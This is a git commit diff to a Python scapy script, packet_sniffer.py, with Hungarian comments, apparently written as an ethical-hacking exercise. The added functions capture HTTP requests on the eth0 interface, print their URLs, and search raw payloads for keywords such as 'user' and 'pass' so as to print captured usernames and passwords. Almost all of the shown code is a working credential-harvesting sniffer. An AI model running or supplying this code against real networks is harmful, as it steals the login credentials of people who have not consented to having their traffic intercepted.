3903262a6207189a04fd7beeb6b83367202d8e77
Gogi0903 <gogh.jozsef@gmail.com>
2023-10-15 18:07:53 -0400

    renaming main.py

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -6,10 +6,26 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)                                               # iface=az interface, amit monitorozunk, store=mentjuk e a packeteket, vagy sem, prn=az a funkció, amit a monitorozás során a packeteken végre akarunk hajtani (callback function).
 
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = str(packet[scapy.Raw].load)                                                                              # [] közé tesszük a layer-t, amit keresünk, a '.load' a field a layeren belül, ami érdekel minket
+        keywords = ["user", "pass", "User", "Pass"]
+        for keyword in keywords:
+            if keyword in load:
+                return load
+
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):                                                                               # ellenőrzi, hogy a pcket rendelkezik e layerrel, és az HTTP request e.
-        if packet.haslayer(scapy.Raw):
-            print(packet[scapy.Raw].load)                                                                               # [] közé tesszük a layer-t, amit keresünk, a '.load' a field a layeren belül, ami érdekel minket
+        url = get_url(packet=packet)
+        print(f"[+] HTTP Request >> {url}")
+        login_info = get_login_info(packet=packet)
+        if login_info:
+            print(f"\n\n[+] Possible username/password > {login_info}\n\n")
 
 
 sniff("eth0")
